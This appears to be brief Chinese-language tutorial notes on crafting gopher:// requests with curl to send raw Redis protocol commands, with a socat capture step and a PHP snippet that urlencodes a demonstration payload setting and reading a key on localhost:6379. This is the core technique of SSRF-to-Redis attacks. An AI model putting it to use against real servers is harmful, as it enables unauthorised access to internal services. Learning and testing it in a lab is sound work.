curl -V 获取支持的协议包含gopher

获取输入的网络流:
socat -v tcp-listen:6377,fork tcp4:localhost:6379


用任何一种语言对输出做urlencode编码
<?php

$message = "*3\r
$3\r
set\r
$1\r
a\r
$11\r
hihackworld\r
*2\r
$3\r
get\r
$1\r
a\r
";

$cmd = " curl -s \"gopher://localhost:6379/_" . urlencode($message) . '"';
echo $cmd . "\n";


